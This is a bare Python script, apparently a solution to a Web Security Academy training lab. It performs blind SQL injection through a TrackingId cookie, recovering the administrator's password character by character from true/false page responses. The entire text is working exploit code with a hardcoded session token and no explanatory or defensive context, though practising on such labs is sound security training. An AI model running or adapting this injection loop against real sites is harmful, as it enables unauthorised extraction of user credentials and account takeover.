import requests
import string

url = 'https://0ab6000804d58734811b8ac1006300ab.web-security-academy.net'
password = ''
last = -1

while last != len(password):
    last += 1
    for c in string.ascii_lowercase+string.digits:
        passwordTest = password+c

        payload = f'\' OR (SELECT COUNT(*) FROM users WHERE username=\'administrator\' AND SUBSTRING(password,1,{len(passwordTest)})=\'{passwordTest}\')>=1--'
        #print(f'Trying: {payload}')
        cookies = {'TrackingId':payload, 'session':'Gecruc5qhsLK5mMOrI7kYJ7Wcl5mhPnN'}

        r = requests.get(url,cookies=cookies)

        if 'Welcome' in r.text:
            password = passwordTest
            print(f'Password: {password}')
            break
